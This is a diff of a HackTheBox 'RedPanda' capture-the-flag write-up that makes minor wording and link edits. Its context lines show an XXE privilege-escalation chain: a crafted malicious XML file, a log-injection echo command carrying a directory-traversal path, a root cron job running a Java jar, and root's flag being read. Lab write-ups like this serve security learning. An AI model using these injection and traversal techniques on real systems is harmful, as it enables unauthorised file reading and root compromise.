@@ -639,7 +639,7 @@ for (Element el : rootElement.getChildren()) {
 
 Armed with this information, we can finally craft our malicious XML file:
 
-I'll use a XXE payload from [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).
+I'll use a XXE payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).
 
 **pwned_creds.xml:**
 ```xml
@@ -706,6 +706,8 @@ woodenk@redpanda:/dev/shm$ echo "200||anything||anything||/../../../../../../../
 2022/09/12 10:18:01 CMD: UID=0    PID=127435 | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
 ```
 
+The cronjob has executed, let's confirm the exploit works:
+
 ```xml
 woodenk@redpanda:/dev/shm$ cat pwned_creds.xml 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -767,8 +769,6 @@ root@redpanda:~# cat /root/root.txt
 ```
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/RedPanda/images/a6.png)
-
-- [https://www.hackthebox.com/achievement/machine/740372/481]https://www.hackthebox.com/achievement/machine/740372/481
 
 # Conclusion
 
